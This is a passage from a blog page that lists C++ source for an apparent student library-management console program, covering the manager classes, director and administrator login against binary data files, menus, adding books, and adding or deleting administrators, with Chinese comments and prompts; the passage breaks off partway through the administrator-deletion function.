<h2 id="manage-h"><a href="#manage-h" class="headerlink" title="manage.h"></a>manage.h</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MANAGE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MANAGE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;struct.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manage</span> &#123;</span></span><br><span class="line">	<span class="keyword">protected</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		~Manage() &#123;&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">addbook</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">searchperson</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admins</span>:</span> <span class="keyword">public</span> Manage &#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">char</span> *admin_name;</span><br><span class="line">		<span class="keyword">char</span> *admin_password;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> admin_ID;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		Admins() &#123;&#125;</span><br><span class="line">		~Admins() &#123;</span><br><span class="line">			<span class="keyword">delete</span> []admin_name;</span><br><span class="line">			<span class="keyword">delete</span> []admin_password;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">choose</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Directors</span>:</span> <span class="keyword">public</span> Manage &#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">addadmin</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">deladmin</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">changeID</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">changepassword</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">choose</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h2 id="manage-cpp"><a href="#manage-cpp" class="headerlink" title="manage.cpp"></a>manage.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;manage.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;basic.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//管理者登录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Manage::login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Admins admin;</span><br><span class="line">	Directors director;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*********************************请登录*********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入ID:\t&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> director_ID[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> manage_password[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; director_ID;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		fstream read;</span><br><span class="line">		directors d_login;</span><br><span class="line">		admins a_login;</span><br><span class="line">		read.open(<span class="string">&quot;director_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断用户名是否为馆长ID</span></span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断馆长是否登录成功</span></span><br><span class="line">		<span class="keyword">int</span> o = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断用户名ID是否为管理员ID</span></span><br><span class="line">		<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!read)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			read.read((<span class="keyword">char</span> *)&amp;d_login, <span class="keyword">sizeof</span> d_login);</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(director_ID, d_login.ID)) &#123;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入馆长密码:\t&quot;</span>;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; manage_password;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(manage_password, d_login.password)) &#123;</span><br><span class="line">						n = <span class="number">1</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n********************************登录成功********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆长您好!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						director.choose();</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆长密码错误! 请重新输入:\t&quot;</span>;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (m == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		read.close();</span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">long</span> <span class="keyword">long</span> admin_ID = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(director_ID); j++) &#123;</span><br><span class="line">				admin_ID = admin_ID + ((<span class="keyword">int</span>)director_ID[j] - <span class="number">48</span>) * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="built_in">strlen</span>(director_ID) - j - <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			read.open(<span class="string">&quot;admins_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!read)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				read.read((<span class="keyword">char</span> *)&amp;a_login, <span class="keyword">sizeof</span> a_login);</span><br><span class="line">				<span class="keyword">if</span> (admin_ID == a_login.ID) &#123;</span><br><span class="line">					o = <span class="number">1</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入管理员密码:\t&quot;</span>;</span><br><span class="line">					<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">						<span class="built_in">cin</span> &gt;&gt; manage_password;</span><br><span class="line">						<span class="built_in">cin</span>.ignore();</span><br><span class="line">						<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(manage_password, a_login.password)) &#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n********************************登录成功********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; a_login.name &lt;&lt; <span class="string">&quot;管理员您好!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							admin.choose();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;管理员密码错误! 请重新输入:\t&quot;</span>;</span><br><span class="line">							<span class="keyword">continue</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">0</span> &amp;&amp; o == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;此管理不存在! 请重新输入:\t&quot;</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//馆长选择功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Directors::choose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Basic basic;</span><br><span class="line">	<span class="keyword">char</span> judge2;	<span class="comment">//选择功能</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n请选择:1.-----查找书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       2.-----添加书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       3.-----查找学生/教师&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       4.-----添加管理员&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       5.-----删除管理员&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       6.-----修改登录名&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       7.-----修改密码&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       0.-----退出登录&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge2;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">switch</span> (judge2) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">				basic.booksearch();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">				addbook();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;</span><br><span class="line">				searchperson();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;</span><br><span class="line">				addadmin();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: &#123;</span><br><span class="line">				deladmin();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: &#123;</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入字符无效!请重新输入!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//管理员选择功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Admins::choose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Basic basic;</span><br><span class="line">	<span class="keyword">char</span> judge2;	<span class="comment">//选择功能</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n请选择:\t1.-----查找书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t2.-----查找学生/教师信息&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t3.-----修改登录名&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t4.-----修改密码&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t0.-----退出登录&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge2;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">switch</span> (judge2) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">				basic.booksearch();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">				searchperson();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: &#123;</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入字符无效!请重新输入!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//管理者添加书籍</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Manage::addbook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream writefile;</span><br><span class="line">	fstream readfile0;</span><br><span class="line">	<span class="comment">//验证books.dat是否存在</span></span><br><span class="line">	fstream readfile1;</span><br><span class="line">	<span class="comment">//读取books.dat</span></span><br><span class="line">	fstream readfile2;</span><br><span class="line">	<span class="comment">//读取books_copy.dat</span></span><br><span class="line">	book adding;</span><br><span class="line">	book mid1;</span><br><span class="line">	<span class="comment">//读取文件，遍历结构体中的书籍名</span></span><br><span class="line">	book mid2;</span><br><span class="line">	<span class="comment">//读取文件，存储非添加书籍的结构体</span></span><br><span class="line"></span><br><span class="line">	readfile0.open(<span class="string">&quot;books.dat&quot;</span>, ios::in);</span><br><span class="line">	<span class="comment">//当books.dat不存在时，新建文件</span></span><br><span class="line">	<span class="keyword">if</span> (!readfile0) &#123;</span><br><span class="line">		readfile1.open(<span class="string">&quot;books.dat&quot;</span>, ios::out);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;books.dat创建成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		readfile1.close();</span><br><span class="line">	&#125;</span><br><span class="line">	readfile0.close();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断书籍是否已存在</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要添加的书籍名:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; adding.book_name;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		readfile1.open(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!readfile1)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			readfile1.read((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid1.book_name, adding.book_name) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内已存在此书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				mid1.book_num++;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍名称:\t&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍作者:\t&quot;</span> &lt;&lt; mid1.book_author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍位置:\t&quot;</span> &lt;&lt; mid1.book_location &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;剩余数量:\t&quot;</span> &lt;&lt; mid1.book_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				writefile.open(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">				writefile.write((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">				writefile.clear();</span><br><span class="line">				writefile.close();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		readfile1.close();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">			readfile1.open(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile1)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile1.read((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid2.book_name, adding.book_name) != <span class="number">0</span>) &#123;</span><br><span class="line">					writefile.open(<span class="string">&quot;books_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">					writefile.write((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">					writefile.clear();</span><br><span class="line">					writefile.close();</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			readfile1.close();</span><br><span class="line"></span><br><span class="line">			readfile1.open(<span class="string">&quot;books.dat&quot;</span>, ios::out);</span><br><span class="line">			readfile1.close();</span><br><span class="line">			readfile2.open(<span class="string">&quot;books_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile2.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile2)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile2.read((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.open(<span class="string">&quot;books.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">				writefile.write((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.clear();</span><br><span class="line">				writefile.close();</span><br><span class="line">			&#125;</span><br><span class="line">			readfile2.close();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;	<span class="comment">//馆内未添加该书籍时</span></span><br><span class="line">			writefile.open(<span class="string">&quot;books.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要添加的书籍作者:\t&quot;</span>;</span><br><span class="line">			<span class="built_in">cin</span>.getline(adding.book_author, <span class="number">15</span>);</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要添加的书籍所放位置:\t&quot;</span>;</span><br><span class="line">			<span class="built_in">cin</span>.getline(adding.book_location, <span class="number">25</span>);</span><br><span class="line">			writefile.write((<span class="keyword">char</span> *)&amp;adding, <span class="keyword">sizeof</span>(adding));</span><br><span class="line">			writefile.clear();</span><br><span class="line">			writefile.close();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否要继续添加(Y/N):\t&quot;</span>;</span><br><span class="line">		<span class="keyword">char</span> judge1;</span><br><span class="line">		<span class="comment">//判断是否进行下一次添加</span></span><br><span class="line">		<span class="keyword">int</span> judge2 = <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//判断输入字符有效性</span></span><br><span class="line">		<span class="keyword">while</span> (judge2) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">			<span class="built_in">cin</span>.ignore();</span><br><span class="line">			<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，请重新输入:\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//馆长添加管理员</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Directors::addadmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream write;</span><br><span class="line">	<span class="comment">//将管理员信息写入文件</span></span><br><span class="line">	write.open(<span class="string">&quot;admins_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">	admins add;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入添加的管理员姓名:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; add.name;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入添加的管理员ID:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; add.ID;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请为添加的管理员初始化密码:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; add.password;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请确认密码:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; password;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, add.password) == <span class="number">0</span>) &#123;</span><br><span class="line">		write.write((<span class="keyword">char</span> *)&amp;add, <span class="keyword">sizeof</span>(add));</span><br><span class="line">		write.close();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">strcmp</span>(password, add.password) != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;两次密码输入不一致 请重新输入:\t&quot;</span>;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; password;</span><br><span class="line">			<span class="built_in">cin</span>.ignore();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, add.password)) &#123;</span><br><span class="line">			write.write((<span class="keyword">char</span> *)&amp;add, <span class="keyword">sizeof</span>(add));</span><br><span class="line">			write.close();</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//馆长删除管理员</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Directors::deladmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	admins del;</span><br><span class="line">	fstream read;</span><br><span class="line">	fstream write;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> mid1;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要删除的管理员ID:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; mid1;</span><br><span class="line">	read.open(<span class="string">&quot;admins_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">	<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!read)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		read.read((<span class="keyword">char</span> *)&amp;del, <span class="keyword">sizeof</span> del);</span><br><span class="line">		<span class="keyword">if</span> (mid1 == del.ID) &#123;</span><br><span class="line">			write.open(<span class="string">&quot;admins_info_copy.dat&quot;</span>, ios::out);</span><br><span class="line">			write.close();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	read.close();</span><br><span class="line">	read.open(<span class="string">&quot;admins_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">	<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!read)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		